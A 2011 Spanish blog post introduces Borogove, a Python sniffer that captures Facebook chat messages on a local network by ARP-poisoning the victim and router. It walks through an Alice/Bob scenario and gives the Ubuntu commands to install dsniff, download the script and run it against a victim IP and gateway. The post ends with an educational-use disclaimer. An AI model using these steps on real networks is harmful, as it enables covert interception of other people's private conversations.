---
layout: post
status: publish
published: true
title: Escuchando conversaciones de Facebook
author:
  display_name: vdo
  login: vdo
  email: vdo.pure@gmail.com
  url: http://
author_login: vdo
author_email: vdo.pure@gmail.com
author_url: http://
wordpress_id: 1728
wordpress_url: http://www.racotecnic.com/?p=1728
date: '2011-01-15 02:21:21 +0100'
date_gmt: '2011-01-15 01:21:21 +0100'
categories:
- Programació
- Linux
- Xarxes Socials
tags:
- Facebook
- chat
- fb
- dsniff
- pypcap
- dpkt
- sniffer
- Python
---
<p><a title="borogove" href="http://code.google.com/p/borogove/" target="_blank">Borogove</a> es un sniffer en Python con el propósito de capturar conversarciones del chat de Facebook en una red local. Usa la técnica <a href="http://es.wikipedia.org/wiki/Ataque_Man-in-the-middle" target="_blank">Man-In-The-Middle</a> envenenando las <a href="http://es.wikipedia.org/wiki/Address_Resolution_Protocol" target="_self">tablas ARP</a>.</p>
<p>Su uso es bastante simple, y nos hace un output de mensajes enviados por los interlocutores en tiempo real.</p>
<p>Para usarlo, debemos instalar las dependencias dsniff, pypcap y dpkt.</p>
<p>Lo mas fácil será ilustrar su uso mediante un ejemplo:</p>
<ul>
<li>En nuestro escenario, <strong>Bob</strong> esta conectado en la misma red local que <strong>Alice</strong>. <strong> </strong></li>
<li><strong>Alice</strong> se conecta a Internet mediante un <strong>Router</strong> o puerta de enlace.</li>
<li>El router tiene la IP 192.168.1.1</li>
<li>Alice tiene la IP 192.168.1.22</li>
<li>Bob tiene la IP 192.168.23</li>
<li>Bob se conecta a la red mediante la interfaz wlan0.</li>
</ul>
<p>Lo que pretende Bob es "engañar" al Router y al PC de Alice, interfiriendo en su comunicación de forma transparente. He aquí un esquema bastante simplificado del proceso:<a href="http://www.racotecnic.com/wp-content/uploads/2011/01/esquema.jpg"><img class="aligncenter size-medium wp-image-1733" src="http://www.racotecnic.com/wp-content/uploads/2011/01/esquema-222x300.jpg" alt="" width="222" height="300" /></a></p>
<p>Una vez hecho esto, puede "inspeccionar" los paquetes que Alice envía o recibe en busca de conversaciones, sin que la víctima note nada (excepto, quizá, una conexión algo mas lenta). Dado que el chat de Facebook no funciona en HTTPS, se envía siempre en texto plano, lo qual es sumamente inseguro y permite este tipo de ataques.</p>
<p>Para usarlo en Ubuntu seguid los siguientes pasos:<br />
[bash]sudo -s<br />
aptitude install dsniff python-pypcap python-dpkg<br />
wget http://borogove.googlecode.com/svn/trunk/borogove.py<br />
chmod +x borogove.py<br />
./borogove.py &amp;lt;interfaz&amp;gt; &amp;lt;IP_vicima&amp;gt; &amp;lt;gateway&amp;gt;[/bash]<br />
Por ejemplo, Bob lo usaría así:<br />
[bash]./borogove.py wlan0 192.168.1.22 192.168.1.1[/bash]<br />
Salud y ya sabéis, usar sólo para fines educativos y bajo vuestra responsabilidad.</p>
